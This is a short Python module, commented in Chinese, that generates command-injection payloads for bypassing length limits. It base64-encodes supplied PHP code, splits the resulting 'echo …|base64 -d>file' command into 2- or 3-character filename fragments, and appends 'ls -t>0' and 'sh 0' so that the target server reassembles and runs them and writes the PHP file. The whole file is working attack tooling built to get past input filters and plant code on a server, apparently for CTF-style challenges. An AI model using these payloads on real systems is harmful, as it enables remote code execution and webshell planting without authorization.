from .base64_tools import base64_encode


def get_split_encode_command(target_php_command: str, target_php_file_name: str, split_n: int) -> list[str]:
    """
    获取Base64编码后的, 按照n分割后的payload
    @param target_php_command: 目标php代码
    @param target_php_file_name: 目标代码的保存文件名
    @param split_n: 每个字段切分的长度
    @return: 切分后的payload, 用来直接注入
    """
    # 将command转换为base64格式 方便绕过
    base64_php_command = base64_encode(target_php_command)
    # 构造执行语句
    main_command = f"echo {base64_php_command}|base64 -d>{target_php_file_name}"
    result = [main_command[i: i + split_n] for i in range(0, len(main_command), split_n)]
    # 处理特殊字符
    for i in range(len(result)):
        result[i] = result[i].replace(" ", "\\ ")
        result[i] = result[i].replace("|", "\\|")
        result[i] = result[i].replace(">", "\\>")
    result.reverse()
    return result


def get_php_payload_7(target_php_command: str, target_php_file_name) -> list[str]:
    result = get_split_encode_command(target_php_command, target_php_file_name, 3)
    # 增加前缀和后缀
    for i in range(len(result)):
        if i == 0:
            result[i] = ">" + result[i]
        else:
            result[i] = ">" + result[i] + "\\"
    result.append("ls -t>0")
    result.append("sh 0")
    return result


def get_php_payload_5(target_php_command: str, target_php_file_name) -> list[str]:
    result = get_split_encode_command(target_php_command, target_php_file_name, 2)
    # 增加前缀和后缀
    for i in range(len(result)):
        if i == 0:
            result[i] = ">" + result[i]
        else:
            result[i] = ">" + result[i] + "\\"
    # 追加一条空语句
    result.append("ls\\")
    result.append(" -t\\")
    result.append(" > 0")
    result.append("sh 0")
    return result
